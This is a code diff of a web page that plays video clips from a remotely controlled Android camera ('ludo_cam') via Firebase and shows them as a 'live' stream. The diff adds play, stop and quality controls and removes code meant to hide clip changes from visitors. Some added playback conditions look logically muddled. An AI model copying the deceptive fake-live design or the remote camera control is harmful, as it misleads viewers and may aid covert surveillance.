@@ -9,8 +9,6 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -26,30 +24,32 @@
         .live-container {
             position: relative;
             width: 100%;
-            max-width: 100%;
+            max-width: 550px;
             background: #000;
+            border-radius: 24px;
+            overflow: hidden;
         }
 
-        /* Video player - NO CONTROLS */
+        /* Video player - minimal controls */
         .live-video {
             width: 100%;
             height: auto;
-            max-height: 100vh;
+            max-height: 60vh;
             object-fit: contain;
             display: block;
-            pointer-events: none;  /* Visitor click nahi kar sakta */
+            background: #000;
         }
 
         /* LIVE Badge - Blinking */
         .live-badge {
-            position: fixed;
-            top: 20px;
-            left: 20px;
+            position: absolute;
+            top: 15px;
+            left: 15px;
             background: #ff0000;
             color: white;
-            font-size: 14px;
+            font-size: 12px;
             font-weight: bold;
-            padding: 6px 14px;
+            padding: 5px 12px;
             border-radius: 30px;
             letter-spacing: 1px;
             z-index: 100;
@@ -64,21 +64,126 @@
             100% { opacity: 1; background: #ff0000; }
         }
 
-        /* Small status text at bottom (minimal) */
-        .live-footer {
-            position: fixed;
-            bottom: 15px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            font-size: 10px;
-            color: rgba(255,255,255,0.3);
-            font-family: monospace;
-            z-index: 100;
-            pointer-events: none;
+        /* Controls Bar */
+        .controls-bar {
+            background: #1a1a1a;
+            padding: 12px 16px;
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            align-items: center;
+            border-top: 1px solid #333;
+            border-bottom: 1px solid #333;
+            flex-wrap: wrap;
         }
 
-        /* Hide all video controls completely */
+        .btn {
+            padding: 10px 24px;
+            border: none;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: monospace;
+        }
+
+        .btn-play {
+            background: #00ff88;
+            color: #000;
+        }
+
+        .btn-play:hover {
+            background: #00cc6e;
+            transform: scale(1.02);
+        }
+
+        .btn-stop {
+            background: #ff4444;
+            color: #fff;
+        }
+
+        .btn-stop:hover {
+            background: #cc0000;
+            transform: scale(1.02);
+        }
+
+        /* Quality Selector */
+        .quality-section {
+            background: #1a1a1a;
+            padding: 10px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #333;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .quality-label {
+            color: #888;
+            font-size: 12px;
+            font-family: monospace;
+        }
+
+        .quality-select {
+            background: #2a2a2a;
+            border: 1px solid #444;
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 24px;
+            cursor: pointer;
+            font-size: 12px;
+            font-family: monospace;
+        }
+
+        .quality-select:hover {
+            background: #333;
+        }
+
+        /* Status Row */
+        .status-row {
+            background: #111;
+            padding: 8px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 10px;
+            font-family: monospace;
+            color: #555;
+            border-bottom: 1px solid #222;
+        }
+
+        .online-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ff4444;
+            transition: all 0.2s;
+        }
+
+        .status-dot.green {
+            background: #00ff88;
+            box-shadow: 0 0 8px #00ff88;
+        }
+
+        .status-text {
+            color: #fff;
+            font-size: 10px;
+        }
+
+        .device-name {
+            color: #00ff88;
+            font-size: 10px;
+        }
+
+        /* Hide default video controls */
         video::-webkit-media-controls {
             display: none !important;
         }
@@ -88,14 +193,8 @@
         video::-webkit-media-controls-panel {
             display: none !important;
         }
-        video::-webkit-media-controls-overlay-play-button {
-            display: none !important;
-        }
-        video::-internal-media-controls-overlay-cast-button {
-            display: none !important;
-        }
 
-        /* No video message - hidden by default, very subtle */
+        /* No video message */
         .no-video {
             position: absolute;
             top: 0;
@@ -107,31 +206,65 @@
             align-items: center;
             background: #000;
             color: #333;
-            font-size: 14px;
+            font-size: 12px;
             font-family: monospace;
         }
-        
-        /* Hide any extra elements */
+
         .hidden {
             display: none !important;
+        }
+
+        /* Video wrapper for relative positioning */
+        .video-wrapper {
+            position: relative;
+            aspect-ratio: 16 / 9;
+            background: #000;
         }
     </style>
 </head>
 <body>
 
 <div class="live-container">
-    <video id="liveVideo" class="live-video" autoplay muted playsinline disablePictureInPicture></video>
-    <div class="live-badge">🔴 LIVE</div>
-    <div class="live-footer">LIVE STREAM</div>
-    <div class="no-video hidden" id="noVideo">Connecting to stream...</div>
+    <!-- Video Section -->
+    <div class="video-wrapper">
+        <video id="liveVideo" class="live-video" autoplay muted playsinline disablePictureInPicture></video>
+        <div class="live-badge">🔴 LIVE</div>
+        <div class="no-video hidden" id="noVideo">Connecting to stream...</div>
+    </div>
+
+    <!-- Status Row -->
+    <div class="status-row">
+        <div class="online-status">
+            <div class="status-dot" id="statusDot"></div>
+            <span class="status-text" id="statusText">Offline</span>
+        </div>
+        <div class="device-name" id="deviceName">—</div>
+    </div>
+
+    <!-- Quality Section -->
+    <div class="quality-section">
+        <span class="quality-label">🎥 STREAM QUALITY</span>
+        <select class="quality-select" id="qualitySelect">
+            <option value="120p">120p (Low)</option>
+            <option value="240p">240p</option>
+            <option value="360p" selected>360p (Default)</option>
+            <option value="480p">480p (HD)</option>
+            <option value="720p">720p (HD+)</option>
+        </select>
+    </div>
+
+    <!-- Controls Bar -->
+    <div class="controls-bar">
+        <button class="btn btn-play" id="playBtn">▶ PLAY</button>
+        <button class="btn btn-stop" id="stopBtn">⏹ STOP</button>
+    </div>
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 <script>
     // ============================================================
-    // LIVE FEEL WEBSITE - Seamless auto-play, next video automatically
-    // Visitor ko pata nahi chalega video change hua!
+    // LIVE FEEL WEBSITE - With Play, Stop, Quality Controls
     // ============================================================
     
     const firebaseConfig = {
@@ -146,8 +279,15 @@
 
     const API_URL = "/api/photos";
 
+    // DOM Elements
     const video = document.getElementById('liveVideo');
     const noVideoDiv = document.getElementById('noVideo');
+    const playBtn = document.getElementById('playBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const qualitySelect = document.getElementById('qualitySelect');
+    const statusDot = document.getElementById('statusDot');
+    const statusText = document.getElementById('statusText');
+    const deviceNameSpan = document.getElementById('deviceName');
     
     // Video queue for seamless transition
     let videoQueue = [];
@@ -155,25 +295,82 @@
     let isPlaying = false;
     let isWaitingForVideo = false;
     let deviceId = null;
+    let currentQuality = "360p";
     
     // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    // 🔥 Quality command (if needed)
-    function sendQualityCommand(quality) {
-        if (!deviceId) return;
-        database.ref(`ludo_cam/commands/${deviceId}`).set({ quality: quality });
-    }
-
-    // Get device info from Firebase
+    // ============================================================
+    // FIREBASE: GET DEVICE STATUS & ONLINE STATUS
+    // ============================================================
     database.ref('ludo_cam/devices').on('value', (snapshot) => {
         const devices = snapshot.val();
+        let isOnline = false;
+        let onlineDeviceName = "";
+
         for (const [id, device] of Object.entries(devices || {})) {
             if (device.online === true) {
+                isOnline = true;
+                onlineDeviceName = device.deviceName || "Camera";
                 deviceId = id;
                 break;
             }
+        }
+
+        if (isOnline) {
+            statusDot.className = 'status-dot green';
+            statusText.innerText = 'LIVE';
+            deviceNameSpan.innerText = `📱 ${onlineDeviceName}`;
+        } else {
+            statusDot.className = 'status-dot';
+            statusText.innerText = 'Offline';
+            deviceNameSpan.innerText = '—';
+        }
+    });
+
+    // ============================================================
+    // SEND QUALITY COMMAND TO ANDROID APP
+    // ============================================================
+    function sendQualityCommand(quality) {
+        if (!deviceId) {
+            console.log('No device connected yet');
+            return;
+        }
+        currentQuality = quality;
+        database.ref(`ludo_cam/commands/${deviceId}`).set({ 
+            quality: quality,
+            timestamp: Date.now()
+        });
+        console.log('Quality command sent:', quality);
+    }
+
+    qualitySelect.addEventListener('change', (e) => {
+        sendQualityCommand(e.target.value);
+    });
+
+    // ============================================================
+    // PLAY BUTTON - Manually start video
+    // ============================================================
+    playBtn.addEventListener('click', () => {
+        if (video.src && video.paused) {
+            video.play().then(() => {
+                isPlaying = true;
+                console.log('Video played manually');
+            }).catch(e => console.log('Play error:', e));
+        } else if (videoQueue.length > 0 && !isPlaying) {
+            playNextVideo();
+        }
+    });
+
+    // ============================================================
+    // STOP BUTTON - Pause video
+    // ============================================================
+    stopBtn.addEventListener('click', () => {
+        if (video.src && !video.paused) {
+            video.pause();
+            isPlaying = false;
+            console.log('Video stopped manually');
         }
     });
 
@@ -201,8 +398,8 @@
                     videoQueue = videoQueue.slice(-3);
                 }
                 
-                // Start playing if not already
-                if (!isPlaying && !isWaitingForVideo && videoQueue.length > 0) {
+                // Start playing if not already and not manually stopped
+                if (!isPlaying && !isWaitingForVideo && videoQueue.length > 0 && !video.paused === false) {
                     playNextVideo();
                 }
             } else {
@@ -217,11 +414,15 @@
 
     // ============================================================
     // PLAY NEXT VIDEO - SEAMLESS TRANSITION
-    // Visitor ko pata nahi chalega!
     // ============================================================
     function playNextVideo() {
         if (videoQueue.length === 0) {
             isWaitingForVideo = true;
+            return;
+        }
+        
+        // Don't auto-play if user manually stopped
+        if (video.paused && !isPlaying) {
             return;
         }
         
@@ -248,12 +449,9 @@
                         video.style.transition = '';
                     }, 350);
                 }).catch(() => {
-                    // Autoplay blocked - still try to play silently
-                    video.muted = true;
-                    video.play().then(() => {
-                        isPlaying = true;
-                        video.style.opacity = '1';
-                    }).catch(e => console.log('Playback error'));
+                    // Autoplay blocked - show play button hint
+                    video.style.opacity = '1';
+                    isPlaying = false;
                 });
             }
         }, 100);
@@ -261,24 +459,20 @@
 
     // ============================================================
     // WHEN VIDEO ENDS - AUTOMATICALLY PLAY NEXT
-    // Visitor ko pata nahi chalega!
     // ============================================================
     video.addEventListener('ended', () => {
         isPlaying = false;
         
-        if (videoQueue.length > 0) {
+        if (videoQueue.length > 0 && !video.paused) {
             // Play next video immediately
             playNextVideo();
-        } else {
-            // No video in queue, wait for next fetch
+        } else if (videoQueue.length === 0) {
             isWaitingForVideo = true;
-            // Show subtle waiting state (but don't disrupt experience)
-            video.style.opacity = '0.5';
         }
     });
 
     // ============================================================
-    // FIX: If video gets stuck, try to recover
+    // VIDEO ERROR HANDLING
     // ============================================================
     video.addEventListener('error', () => {
         console.log('Video error, skipping to next');
@@ -289,8 +483,7 @@
     });
 
     // ============================================================
-    // POLL EVERY 3 SECONDS (Faster than before)
-    // Visitor ko pata nahi chalega kab naya video aaya
+    // POLL EVERY 3 SECONDS FOR NEW VIDEOS
     // ============================================================
     
     // Initial fetch
@@ -299,21 +492,20 @@
     // Poll every 3 seconds for new videos
     setInterval(fetchLatestVideos, 3000);
     
-    // Also poll device status for quality commands every 5 seconds
+    // Poll device status every 5 seconds
     setInterval(() => {
         if (deviceId) {
             database.ref(`ludo_cam/commands/${deviceId}`).once('value', (snapshot) => {
                 const cmd = snapshot.val();
                 if (cmd && cmd.quality) {
-                    // Quality command is received but we don't need to display anything
-                    console.log('Quality command received:', cmd.quality);
+                    console.log('Quality acknowledged:', cmd.quality);
                 }
             });
         }
     }, 5000);
     
     // ============================================================
-    // ENSURE VIDEO NEVER SHOWS CONTROLS
+    // HIDE DEFAULT CONTROLS
     // ============================================================
     video.controls = false;
     video.removeAttribute('controls');
@@ -324,14 +516,7 @@
         return false;
     });
     
-    // Handle visibility change (tab switch) - resume playing silently
-    document.addEventListener('visibilitychange', () => {
-        if (!document.hidden && !isPlaying && videoQueue.length > 0) {
-            playNextVideo();
-        }
-    });
-    
-    console.log('Live stream ready - Visitor will see seamless live experience');
+    console.log('Live stream ready - Play, Stop, Quality controls available');
 </script>
 </body>
 </html>
